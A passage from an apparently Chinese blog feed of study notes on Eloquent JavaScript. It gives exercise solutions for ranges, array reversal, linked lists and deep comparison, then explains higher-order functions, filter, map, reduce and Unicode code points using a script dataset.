<p>让range函数接收一个可选的第三个参数，表示步长。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">range</span>(<span class="params">start, end, step = <span class="number">1</span></span>) </span>&#123;</span><br><span class="line">  arr = []</span><br><span class="line">  <span class="keyword">if</span>(step &gt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">let</span> i = start; i &lt;= end; i += step) &#123;</span><br><span class="line">      arr.push(i);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span>(step &lt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">let</span> i = start; i &gt;= end; i += step) &#123;</span><br><span class="line">      arr.push(i);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> arr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="反转一个数组"><a href="#反转一个数组" class="headerlink" title="反转一个数组"></a>反转一个数组</h3><p>分别写函数<code>reverseArray</code>，产生一个全新的数组，包含原数组的反转元素；函数<code>reverseArrayInPlace</code>，原地反转原数组。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">reverseArray</span>(<span class="params">arr</span>) </span>&#123;</span><br><span class="line">  newarr = [];</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">let</span> i = arr.length - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--) &#123;</span><br><span class="line">    newarr.push(arr[i]);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> newarr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">reverseArrayInPlace</span>(<span class="params">arr</span>) </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">swap</span>(<span class="params">arr, i, j</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> temp = arr[i];</span><br><span class="line">    arr[i] = arr[j];</span><br><span class="line">    arr[j] = temp;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; arr.length / <span class="number">2</span>; i++) &#123;</span><br><span class="line">    swap(arr, i, arr.length - i - <span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="链表"><a href="#链表" class="headerlink" title="链表"></a>链表</h3><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> list = &#123;</span><br><span class="line">  value: <span class="number">1</span>,</span><br><span class="line">  rest: &#123;</span><br><span class="line">    value: <span class="number">2</span>,</span><br><span class="line">    rest: &#123;</span><br><span class="line">      value: <span class="number">3</span>,</span><br><span class="line">      rest: <span class="literal">null</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>写一个<code>arrayToList</code>方法，给定<code>[1,2,3]</code>这样的数组，返回上面的list结构。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">arrayToList</span>(<span class="params">arr</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> l = arr.length;</span><br><span class="line">  <span class="keyword">let</span> obj = &#123;&#125;;</span><br><span class="line">  <span class="keyword">let</span> p = obj;</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; l; i++) &#123;</span><br><span class="line">    p.value = arr[i];</span><br><span class="line">    <span class="keyword">if</span>(i == l - <span class="number">1</span>) &#123;p.rest = <span class="literal">null</span>; <span class="keyword">break</span>;&#125;</span><br><span class="line">    p.rest = &#123;&#125;;</span><br><span class="line">    p = p. rest;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> obj;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>写一个<code>listToArray</code>方法，给定上述list格式，返回数组表示。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">listToArray</span>(<span class="params">lst</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> obj = lst;</span><br><span class="line">  <span class="keyword">let</span> arr = [];</span><br><span class="line">  <span class="keyword">while</span>(obj != <span class="literal">null</span>) &#123;</span><br><span class="line">    arr.push(obj.value);</span><br><span class="line">    obj = obj.rest;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> arr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>写一个<code>prepend</code>方法在list前部添加一个元素，返回一个新的list。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">prepend</span>(<span class="params">item, lst</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> newlst = &#123;&#125;;</span><br><span class="line">  newlst.value = item;</span><br><span class="line">  newlst.rest = lst;</span><br><span class="line">  <span class="keyword">return</span> newlst;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>写一个返回list中第n个位置上的value。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">nth</span>(<span class="params">lst, index</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> i = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">let</span> p = lst;</span><br><span class="line">  <span class="keyword">while</span>(p != <span class="literal">null</span> &amp;&amp; i++ != index) </span><br><span class="line">    p = p.rest;</span><br><span class="line">  <span class="keyword">if</span>(p == <span class="literal">null</span>) <span class="keyword">return</span>;</span><br><span class="line">  <span class="keyword">return</span> p.value;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>写一个递归版本的nth函数</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">nth</span>(<span class="params">lst, index</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(lst == <span class="literal">null</span>) <span class="keyword">return</span>;</span><br><span class="line">  <span class="keyword">if</span>(index === <span class="number">0</span>) <span class="keyword">return</span> lst.value;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">return</span> nth(lst.rest, index - <span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="深度比较"><a href="#深度比较" class="headerlink" title="深度比较"></a>深度比较</h3><p><code>==</code>比较对象基于同一性，即两个变量指向同一个实际的对象。但是有时候想要根据实际的属性比较对象的值。写一个深度比较函数基于对象的属性进行比较。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">deepEqual</span>(<span class="params">a, b</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(a == b) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">if</span>(a == <span class="literal">null</span> || <span class="keyword">typeof</span> a != <span class="string">'object'</span> || b == <span class="literal">null</span> || <span class="keyword">typeof</span> b != <span class="string">'object'</span>) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">let</span> arrA = <span class="built_in">Object</span>.keys(a), arrB = <span class="built_in">Object</span>.keys(b);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(arrA.length != arrB.length) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">let</span> key <span class="keyword">of</span> arrA) &#123;</span><br><span class="line">    <span class="keyword">if</span>(!arrB.includes(key) || !deepEqual(a[key], b[key])) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Eloquent JavaScript</category>
      </categories>
  </entry>
  <entry>
    <title>EJ5</title>
    <url>/2018/12/25/EJ5/</url>
    <content><![CDATA[<h1 id="高阶函数"><a href="#高阶函数" class="headerlink" title="高阶函数"></a>高阶函数</h1><p>我们首先来看两个范围和程序的例子：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> total = <span class="number">0</span>, count = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">while</span> (count &lt;= <span class="number">10</span>) &#123;</span><br><span class="line">  total += count;</span><br><span class="line">  count += <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">console</span>.log(total);</span><br></pre></td></tr></table></figure>

<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">console</span>.log(sum(range(<span class="number">1</span>, <span class="number">10</span>)));</span><br></pre></td></tr></table></figure>
<p>显而易见，第二种策略更加清晰且不易出错。因为我们将程序设计在一个词汇表框架中，对一个范围内的数字求和无关循环和计数器，而是关于范围(range)以及和(sum)函数。</p>
<p>虽然sum和range内部也会包含循环，计数器等，但他们比将整个程序写在一起，表达了更简单的概念。</p>
<a id="more"></a>

<h2 id="抽象"><a href="#抽象" class="headerlink" title="抽象"></a>抽象</h2><p>在编程中，这种类型的词汇表叫做abstraction(抽象)。抽象隐藏程序实现的细节，赋予我们一种在更高层次考虑问题的能力。</p>
<h2 id="抽象重复"><a href="#抽象重复" class="headerlink" title="抽象重复"></a>抽象重复</h2><p>普通函数也是一种构建抽象的好方法，但是有时远远不够。</p>
<p>重复做一件事对于一个程序来说是很常见的。可以写个for循环，比如：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++) &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(i);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>可以做如下改进：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">repeatLog</span>(<span class="params">n</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(i);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>但我们要想有除打印以外的行为时，这种方法就不奏效了。于是我们想把行为抽象成函数，由于JS中函数也是值，所以是可行的。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">repeat</span>(<span class="params">n, action</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; n; i++) </span><br><span class="line">    action(i);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> labels = [];</span><br><span class="line">repeat(<span class="number">5</span>, i =&gt; &#123;</span><br><span class="line">  labels.push(<span class="string">`Unit <span class="subst">$&#123;i + <span class="number">1</span>&#125;</span>`</span>);</span><br><span class="line">&#125;)</span><br><span class="line"><span class="built_in">console</span>.log(labels);</span><br><span class="line"><span class="comment">// -&gt; ["Unit 1", "Unit 2", "Unit 3", "Unit 4", "Unit 5"]</span></span><br></pre></td></tr></table></figure>

<h2 id="高阶函数-1"><a href="#高阶函数-1" class="headerlink" title="高阶函数"></a>高阶函数</h2><p>接收函数作为参数，或者返回函数的函数叫做高阶函数（high order function）。高阶函数不仅允许我们抽象值，更实现了对行为的抽象。如，我们可以有创造新函数的函数。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">greaterThan</span>(<span class="params">n</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="function"><span class="params">m</span> =&gt;</span> m &gt; n;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> greaterThan10 = greaterThan(<span class="number">10</span>);</span><br><span class="line"><span class="built_in">console</span>.log(greaterThan10(<span class="number">11</span>));</span><br><span class="line"><span class="comment">// -&gt; true</span></span><br></pre></td></tr></table></figure>

<p>我们也可以实现改变别的函数的函数：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">noisy</span>(<span class="params">f</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="function">(<span class="params">...args</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">"calling with"</span>, args);</span><br><span class="line">    <span class="keyword">let</span> result = f(...args);</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">"called with"</span>, args, <span class="string">", returned"</span>, result);</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;</span><br><span class="line">noisy(<span class="built_in">Math</span>.min)(<span class="number">3</span>, <span class="number">2</span>, <span class="number">1</span>);</span><br><span class="line"><span class="comment">// → calling with [3, 2, 1]</span></span><br><span class="line"><span class="comment">// → called with [3, 2, 1] , returned 1</span></span><br></pre></td></tr></table></figure>

<p>我们甚至可以提供新的控制流：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">unless</span>(<span class="params">test, then</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (!test) then();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">repeat(<span class="number">3</span>, n =&gt; &#123;</span><br><span class="line">  unless(n % <span class="number">2</span> == <span class="number">1</span>, () =&gt; &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(n, <span class="string">"is even"</span>);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;);</span><br><span class="line"><span class="comment">// → 0 is even</span></span><br><span class="line"><span class="comment">// → 2 is even</span></span><br></pre></td></tr></table></figure>

<p>数组有个<code>forEach</code>方法，有点像是高阶函数的<code>for/of</code>版本。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">[<span class="string">"A"</span>, <span class="string">"B"</span>].forEach(<span class="function"><span class="params">l</span> =&gt;</span> <span class="built_in">console</span>.log(l));</span><br><span class="line"><span class="comment">// -&gt; A</span></span><br><span class="line"><span class="comment">// -&gt; B</span></span><br></pre></td></tr></table></figure>

<h2 id="script数据集"><a href="#script数据集" class="headerlink" title="script数据集"></a>script数据集</h2><p>高阶函数擅长用于数据处理领域。我们本章使用关于script的数据集。</p>
<p>回忆第一章的Unicode码，Unicode为每种语言中的字符都分配一个数字。它们中的大多数都关联到一个特定的script。</p>
<p>数据集包含140种Unicode中定义的script。绑定<code>SCRIPTS</code>包含一份对象数组，每一个对象描述了一个script。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  name: <span class="string">"Coptic"</span>,</span><br><span class="line">  ranges: [[<span class="number">994</span>, <span class="number">1008</span>], [<span class="number">11392</span>, <span class="number">11508</span>], [<span class="number">11513</span>, <span class="number">11520</span>]],</span><br><span class="line">  direction: <span class="string">"ltr"</span>,</span><br><span class="line">  year: <span class="number">-200</span>,</span><br><span class="line">  living: <span class="literal">false</span>,</span><br><span class="line">  link: <span class="string">"https://en.wikipedia.org/wiki/Coptic_alphabet"</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>每个对象包含Unicode为其分配的数字范围，起源时间，是否仍在使用中，和一个更多信息的链接。方向可以是”ltr”(left to right),”rtl”,”ttb”(top to bottom)。ranges是左闭右开区间。</p>
<h2 id="过滤数组"><a href="#过滤数组" class="headerlink" title="过滤数组"></a>过滤数组</h2><p>为了找到还在使用的script，下面的函数是有用的。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params">array, test</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> passed = [];</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">let</span> element <span class="keyword">of</span> array) &#123;</span><br><span class="line">    <span class="keyword">if</span>(test(element)) &#123;</span><br><span class="line">      passed.push(element);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> passed;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">console</span>.log(filter(SCRIPTS, script =&gt; script.living))</span><br></pre></td></tr></table></figure>

<p>filter是一个pure函数，不修改给定的数组。返回过滤过后的新数组。</p>
<p>像<code>forEach</code>一样，<code>filter</code>是一个标准的数组方法。例子只是展示了它的内部实现。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">console</span>.log(SCRIPTS.filter(<span class="function"><span class="params">s</span> =&gt;</span> s.direction == <span class="string">"ttb"</span>));</span><br><span class="line"><span class="comment">// → [&#123;name: "Mongolian", …&#125;, …]</span></span><br></pre></td></tr></table></figure>

<h2 id="用map转换"><a href="#用map转换" class="headerlink" title="用map转换"></a>用map转换</h2><p>我们现在有一个对象数组，但我们想要一个名字数组。</p>
<p>map方法通过将函数应用到每个数组元素上，并且返回一个新构建的数组。数组长度不变，但内容已从函数返回值做了相应的映射。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">map</span>(<span class="params">array, transform</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> mapped = [];</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">let</span> element <span class="keyword">of</span> array) &#123;</span><br><span class="line">    mapped.push(transform(element));</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> mapped;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> rtlScripts = SCRIPTS.filter(<span class="function"><span class="params">s</span> =&gt;</span> s.direction == <span class="string">'rtl'</span>);</span><br><span class="line"><span class="built_in">console</span>.log(map(rtlScripts, s =&gt; s.name));</span><br><span class="line"><span class="comment">// → ["Adlam", "Arabic", "Imperial Aramaic", …]</span></span><br></pre></td></tr></table></figure>
<p>像<code>forEach</code>和<code>filter</code>一样，<code>map</code>也是标准的数组方法。</p>
<h2 id="用reduce汇总"><a href="#用reduce汇总" class="headerlink" title="用reduce汇总"></a>用reduce汇总</h2><p>另一种关于数组的常规的操作时从数组元素上计算单个值。我们反复出现的例子，对一些数字求和，就是这样的实例。另一个例子是找到拥有最多字符的书写体。</p>
<p>代表这种模式的操作是<code>reduce</code>，有时也被叫做<code>fold</code>。通过处理当前数组中的值并把它和current value组合，当处理数字和时，开始于0，对于每个元素，将其加到和中。</p>
<p>reduce接收三个参数，除了数组，还有一个组合函数，以及一个初始值。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">reduce</span>(<span class="params">array, combine, start</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> current = start;</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">let</span> element <span class="keyword">of</span> array) &#123;</span><br><span class="line">    current = combine(current, element);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> current;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(reduce([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>], (a, b) =&gt; a + b, <span class="number">0</span>));</span><br><span class="line"><span class="comment">// -&gt; 10</span></span><br></pre></td></tr></table></figure>
<p>标准的JS数组reduce方法，还有一个便利的地方。如果给定数组包含至少一个元素，允许不给定start元素，默认会将第一个元素当作start，并从第二个元素开始reduce。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">console</span>.log([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>].reduce(<span class="function">(<span class="params">a, b</span>) =&gt;</span> a + b));</span><br><span class="line"><span class="comment">// -&gt; 10</span></span><br></pre></td></tr></table></figure>
<p>为了使用reduce方法找到含有最多字符的script，我们需要这样编写代码。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">characterCount</span>(<span class="params">script</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> script.ranges.reduce((count, [<span class="keyword">from</span>, to] =&gt; count + (to - <span class="keyword">from</span>), <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">console</span>.log(SCRIPTS.reduce(<span class="function">(<span class="params">a, b</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> characterCount(a) &lt; characterCount(b) ? b : a;</span><br><span class="line">&#125;));</span><br><span class="line"><span class="comment">// -&gt; &#123;name: "Han", ...&#125;</span></span><br></pre></td></tr></table></figure>

<h2 id="可组合性"><a href="#可组合性" class="headerlink" title="可组合性"></a>可组合性</h2><p>考虑下不用高阶函数我们怎么书写前面的程序。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> biggest = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> script <span class="keyword">of</span> SCRIPTS) &#123;</span><br><span class="line">  <span class="keyword">if</span>(biggest == <span class="literal">null</span> || characterCount(biggest) &lt; characterCount(script)) &#123;</span><br><span class="line">    biggest = script;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">console</span>.log(biggest);</span><br><span class="line"><span class="comment">// -&gt; &#123;name: "Han", ...&#125;</span></span><br></pre></td></tr></table></figure>
<p>这依然是可读的。</p>
<p>当你需要compose操作的时候，高阶函数就会显示出它的光芒。作为一个例子，让我们对于活和死的书写体，找到他们的平均起源年龄。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">average</span>(<span class="params">array</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> array.reduce(<span class="function">(<span class="params">a, b</span>) =&gt;</span> a + b) / array.length;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="built_in">Math</span>.round(average(SCRIPTS.filter(<span class="function"><span class="params">x</span> =&gt;</span> x.living).map(<span class="function"><span class="params">x</span> =&gt;</span> x.year)));</span><br><span class="line"><span class="comment">// -&gt; 1188</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="built_in">Math</span>.round(average(SCRIPTS.filter(<span class="function"><span class="params">x</span> =&gt;</span> !x.living).map(<span class="function"><span class="params">x</span> =&gt;</span> x.year))));</span><br><span class="line"><span class="comment">// -&gt; 188</span></span><br></pre></td></tr></table></figure>
<p>将上述过程看作管线化操作，首先过滤出living的script，然后从对象中取出year，然后做平均，然后做round。</p>
<p>也可以写一个大循环。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> total = <span class="number">0</span>, count = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> script <span class="keyword">of</span> SCRIPTS) &#123;</span><br><span class="line">  <span class="keyword">if</span>(script.living) &#123;</span><br><span class="line">    total += script.year;</span><br><span class="line">    count += <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="built_in">Math</span>.round(total / count));</span><br></pre></td></tr></table></figure>
<p>但是可读性不好，而且也不容易抽象出average函数。</p>
<p>就计算机实际所做的事情而言，这两种方法不大相同。第一种方法通过filter和map构建数组。第二种方法只计算一些数字，做更少的事情。通常可以支付的起易读程序的代码，但是处理大数组的时候，第二种方法在速度上的提升是值得我们考虑的。</p>
<h2 id="字符串和字符代码"><a href="#字符串和字符代码" class="headerlink" title="字符串和字符代码"></a>字符串和字符代码</h2><p>数据集的一种用途是找到文本使用的script。</p>
<p>每个script包含一个range数组，所以给定一个字符代码，我们可以使用一个函数找到对应的script（如果存在的话）。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">characterScript</span>(<span class="params">code</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">let</span> script <span class="keyword">of</span> SCRIPTS) &#123;</span><br><span class="line">    <span class="keyword">if</span>(script.ranges.some(<span class="function">(<span class="params">[<span class="keyword">from</span>, to]</span>) =&gt;</span> &#123; <span class="keyword">return</span> code &gt;= <span class="keyword">from</span> &amp;&amp; code &lt; to;</span><br><span class="line">    &#125;)) &#123;</span><br><span class="line">      <span class="keyword">return</span> script;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">console</span>.log(characterScript(<span class="number">121</span>));</span><br><span class="line"><span class="comment">// -&gt; &#123;name: "Latin", ...&#125;</span></span><br></pre></td></tr></table></figure>

<p>some是另外一个高阶函数，只要数组中一个元素符合条件，就返回true。</p>
<p>但我们怎么获得字符串中的character code呢？</p>
<p>第一章中提到JS字符串编码为16bit数字序列。这些被叫做code units。我们可以很容易的书写程序假装code units和字符是同一个东西。如果你的语言不使用two-unit字符，那是没问题的。但是如果使用汉字字符，这样的程序就会出现问题。幸运的是，随着emoji的出现，所有人开始使用two-unit字符，处理这样的问题就被均摊了。</p>
<p>不幸的是，JS中字符串的操作，如获取字符串的length属性以及通过中括号获取特定位置字符，只处理code units。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Two emoji characters, horse and shoe</span></span><br><span class="line"><span class="keyword">let</span> horseShoe = <span class="string">"🐴👟"</span>;</span><br><span class="line"><span class="built_in">console</span>.log(horseShoe.length);</span><br><span class="line"><span class="comment">// → 4</span></span><br><span class="line"><span class="built_in">console</span>.log(horseShoe[<span class="number">0</span>]);</span><br><span class="line"><span class="comment">// → (Invalid half-character)</span></span><br><span class="line"><span class="built_in">console</span>.log(horseShoe.charCodeAt(<span class="number">0</span>));</span><br><span class="line"><span class="comment">// → 55357 (Code of the half-character)</span></span><br><span class="line"><span class="built_in">console</span>.log(horseShoe.codePointAt(<span class="number">0</span>));</span><br><span class="line"><span class="comment">// → 128052 (Actual code for horse emoji)</span></span><br></pre></td></tr></table></figure>
<p>JS的<code>charCodeAt</code>方法给一个code unit而不是一个完整的character code。<code>codePointAt</code>方法，给定完整的Unicode字符。所以我们使用<code>codePointAt</code>方法获取字符串中的字符。但是<code>codePointAt</code>方法的参数仍然是一个code units的索引。所以为了遍历到所有的字符串中的字符，我们仍然要解决判断字符占据一个还是两个code units的问题。</p>
<p>在之前的章节，我们提到<code>for/of</code>循环也能被用于字符串。像<code>codePointAt</code>一样，这种类型的循环是在人们意识到UTF16所带来的问题时诞生的。当使用这种方法遍历字符串时，得到的是真实的字符，而不是code units。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> roseDragon = <span class="string">"🌹🐉"</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> char <span class="keyword">of</span> roseDragon) &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(char);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// → 🌹</span></span><br><span class="line"><span class="comment">// → 🐉</span></span><br></pre></td></tr></table></figure>
<p>如果你有一个字符（可能是一个或两个code units），可以用<code>codePointAt</code>方法获取它的code。</p>
<h2 id="识别文本"><a href="#识别文本" class="headerlink" title="识别文本"></a>识别文本</h2><p>我们有一个<code>characterScript</code>函数以及正确遍历字符串的方法。下一步就是计算属于每个script的字符数量。下面的counting抽象将会有用。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">countBy</span>(<span class="params">items, groupName</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> counts = [];</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">let</span> item <span class="keyword">of</span> items) &#123;</span><br><span class="line">    <span class="keyword">let</span> name = groupName(item);</span><br><span class="line">    <span class="keyword">let</span> known = counts.findIndex(<span class="function"><span class="params">c</span> =&gt;</span> c.name == name);</span><br><span class="line">    <span class="keyword">if</span>(known == <span class="number">-1</span>) &#123;</span><br><span class="line">      counts.push(&#123;name, <span class="attr">count</span>: <span class="number">1</span>&#125;);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      counts[known].count++;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> counts;</span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(countBy([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>], n =&gt; n &gt; <span class="number">2</span>));</span><br><span class="line"><span class="comment">// → [&#123;name: false, count: 2&#125;, &#123;name: true, count: 3&#125;]</span></span><br></pre></td></tr></table></figure>
<p><code>countBy</code>函数接受一个collection参数（可用for/of遍历），以及一个函数用于计算给定元素的group name。返回一个对象数组，每一个数组元素对应一组以及该组的元素数量。</p>
<p>其中用到了<code>findIndex</code>数组方法，这个方法有点类似于<code>indexOf</code>，不同的是，该方法返回第一次让参数中的方法返回true的数组元素，如果没有满足条件的元素，返回-1。</p>
<p>使用<code>countBy</code>方法，我们可以写一个函数告诉我们一段文本中使用的script。</p>
